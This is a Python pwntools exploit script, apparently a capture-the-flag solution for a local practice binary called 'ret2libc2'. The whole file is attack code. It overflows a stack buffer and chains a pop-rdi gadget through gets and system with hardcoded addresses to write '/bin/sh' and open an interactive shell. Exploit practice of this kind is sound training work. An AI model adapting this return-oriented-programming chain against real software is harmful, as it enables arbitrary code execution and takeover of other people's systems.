#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./ret2libc2')
elf = ELF('./ret2libc2')

buf1_addr = 0x601040
system_plt = 0x400520
prdi_ret = 0x400723
gets_plt = elf.plt['gets']

payload  = 'A'*0x70 + p64(0)
payload += p64(prdi_ret) + p64(buf1_addr) + p64(gets_plt)
payload += p64(prdi_ret) + p64(buf1_addr) + p64(system_plt)

#gdb.attach(p)
#pause()
p.recvuntil("Please pwn me :)\n")
p.sendline(payload)
p.sendline('/bin/sh')
p.interactive()
